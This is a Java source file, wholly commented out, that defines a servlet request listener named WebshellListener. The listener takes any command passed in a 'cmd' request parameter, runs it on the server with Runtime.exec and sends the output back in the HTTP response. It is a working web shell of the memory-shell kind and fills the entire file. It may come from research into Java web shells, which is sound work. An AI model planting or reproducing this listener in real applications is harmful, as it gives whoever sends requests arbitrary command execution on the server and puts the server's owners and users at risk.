//package com.rs.servlet;
//
//import jakarta.servlet.*;
//import jakarta.servlet.ServletRequestListener;
//import jakarta.servlet.http.HttpServletResponse;
//
//import java.io.BufferedReader;
//import java.io.IOException;
//import java.io.InputStream;
//import java.io.InputStreamReader;
//
//public class WebshellListener implements ServletRequestListener{
//    private HttpServletResponse response;
//    public WebshellListener(HttpServletResponse response){
//        this.response = response;
//    }
//
//    @Override
//    public void requestDestroyed(ServletRequestEvent servletRequestEvent) {
//        System.out.println("requestDestroyed");
//    }
//
//    public void requestInitialized(ServletRequestEvent servletRequestEvent) {
//        ServletRequest request = servletRequestEvent.getServletRequest();
//        try {
//            ServletOutputStream sos = this.response.getOutputStream();
//            String cmd = request.getParameter("cmd");
//            if (cmd != null) {
//                InputStream in = Runtime.getRuntime().exec(cmd).getInputStream();
//                StringBuilder sb = new StringBuilder();
//                BufferedReader br = new BufferedReader(new InputStreamReader(in));
//                String line = null;
//                while((line = br.readLine()) != null){
//                    sb.append(line).append("\n");
//                }
//                if(sb.length() > 0){
//                    sos.write(sb.toString().getBytes());
//                    sos.flush();
//                    sos.close();
//                }
//            }
//        }catch (IOException e){
//            throw new RuntimeException(e);
//        }
//    }
//
//
//}
